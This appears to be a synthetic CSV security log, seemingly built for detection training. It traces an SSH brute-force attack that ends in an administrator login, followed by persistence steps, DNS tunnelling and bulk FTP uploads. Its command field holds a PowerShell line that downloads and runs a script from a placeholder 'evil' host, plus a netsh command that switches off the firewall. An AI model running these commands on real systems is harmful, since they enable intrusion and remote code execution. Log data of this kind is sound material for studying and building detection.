timestamp,source_ip,destination_ip,destination_port,protocol,service,username,event_type,event_status,domain,command,bytes_sent,bytes_received,severity
2026-07-14T14:02:02,203.0.113.66,192.168.10.20,22,TCP,SSH,alice,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:03,203.0.113.66,192.168.10.20,22,TCP,SSH,bob,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:04,203.0.113.66,192.168.10.20,22,TCP,SSH,charlie,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:05,203.0.113.66,192.168.10.20,22,TCP,SSH,david,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:06,203.0.113.66,192.168.10.20,22,TCP,SSH,eve,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:07,203.0.113.66,192.168.10.20,22,TCP,SSH,finance,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:08,203.0.113.66,192.168.10.20,22,TCP,SSH,hr,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:09,203.0.113.66,192.168.10.20,22,TCP,SSH,it,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:10,203.0.113.66,192.168.10.20,22,TCP,SSH,guest,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:11,203.0.113.66,192.168.10.20,22,TCP,SSH,svc,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:12,203.0.113.66,192.168.10.20,22,TCP,SSH,backup,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:13,203.0.113.66,192.168.10.20,22,TCP,SSH,sql,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:14,203.0.113.66,192.168.10.20,22,TCP,SSH,mail,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:15,203.0.113.66,192.168.10.20,22,TCP,SSH,vpn,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:16,203.0.113.66,192.168.10.20,22,TCP,SSH,test,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:17,203.0.113.66,192.168.10.20,22,TCP,SSH,user1,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:18,203.0.113.66,192.168.10.20,22,TCP,SSH,user2,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:02:19,203.0.113.66,192.168.10.20,22,TCP,SSH,root,LOGIN,FAILED,,,100,100,MEDIUM
2026-07-14T14:03:00,203.0.113.66,192.168.10.20,22,TCP,SSH,administrator,LOGIN,SUCCESS,,,120,200,MEDIUM
2026-07-14T14:04:00,203.0.113.66,192.168.10.20,445,TCP,SMB,administrator,SUSPICIOUS_POWERSHELL,ALLOWED,,powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1'),500,800,CRITICAL
2026-07-14T14:05:00,203.0.113.66,192.168.10.20,0,SYS,SYSTEM,administrator,SYSTEM_EVENT,SUCCESS,,netsh advfirewall set allprofiles state off,0,0,CRITICAL
2026-07-14T14:06:00,203.0.113.66,192.168.10.20,0,SYS,SYSTEM,administrator,SYSTEM_EVENT,SUCCESS,,administrator account created,0,0,CRITICAL
2026-07-14T14:07:00,203.0.113.66,192.168.10.20,0,SYS,SYSTEM,administrator,SYSTEM_EVENT,SUCCESS,,schtasks /create /tn updater,0,0,HIGH
2026-07-14T14:08:00,203.0.113.66,8.8.8.8,53,UDP,DNS,administrator,DNS_TUNNELING,ALLOWED,chunk0.abababababababababababababababababababababababababababababab.data-transfer.example,,120,300,CRITICAL
2026-07-14T14:08:01,203.0.113.66,8.8.8.8,53,UDP,DNS,administrator,DNS_TUNNELING,ALLOWED,chunk1.abababababababababababababababababababababababababababababab.data-transfer.example,,120,300,CRITICAL
2026-07-14T14:08:02,203.0.113.66,8.8.8.8,53,UDP,DNS,administrator,DNS_TUNNELING,ALLOWED,chunk2.abababababababababababababababababababababababababababababab.data-transfer.example,,120,300,CRITICAL
2026-07-14T14:08:03,203.0.113.66,8.8.8.8,53,UDP,DNS,administrator,DNS_TUNNELING,ALLOWED,chunk3.abababababababababababababababababababababababababababababab.data-transfer.example,,120,300,CRITICAL
2026-07-14T14:08:04,203.0.113.66,8.8.8.8,53,UDP,DNS,administrator,DNS_TUNNELING,ALLOWED,chunk4.abababababababababababababababababababababababababababababab.data-transfer.example,,120,300,CRITICAL
2026-07-14T14:09:00,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:01,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:02,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:03,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:04,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:05,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:06,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:07,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:08,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
2026-07-14T14:09:09,203.0.113.66,198.51.100.5,21,TCP,FTP,administrator,NETWORK_CONNECTION,SUCCESS,,,2500000,500,HIGH
